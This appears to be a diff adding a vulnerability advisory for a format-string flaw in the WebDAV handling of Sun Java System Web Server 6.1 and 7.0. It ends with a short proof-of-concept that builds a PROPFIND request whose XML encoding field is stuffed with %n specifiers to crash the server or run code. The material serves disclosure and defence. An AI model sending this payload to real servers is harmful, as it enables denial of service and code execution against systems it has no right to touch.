@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/37910/info
+
+Sun Java System Web Server is prone to a format-string vulnerability because it fails to properly sanitize user-supplied input. The issue affects the WebDAV functionality.
+
+Currently very few technical details are available. We will update this BID as more information emerges.
+
+Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+The issues affects the following:
+
+Sun Java System Web Server 7.0 without Update Release 8
+Sun Java System Web Server 6.1 without Service Pack 12 
+
+s="PROPFIND /pages/ HTTP/1.1\n" # WebDAV URI
+s+="Host: localhost\n"
+s+="Depth: 0\n"
+s+="Content-Length: 58\n"
+s+="Content-Type: application/xml\n\n"
+s+="<?xml version=\"1.0\" encoding=\"utf-%n%n%n%n%n%n%n%n%n%n\"?>" 
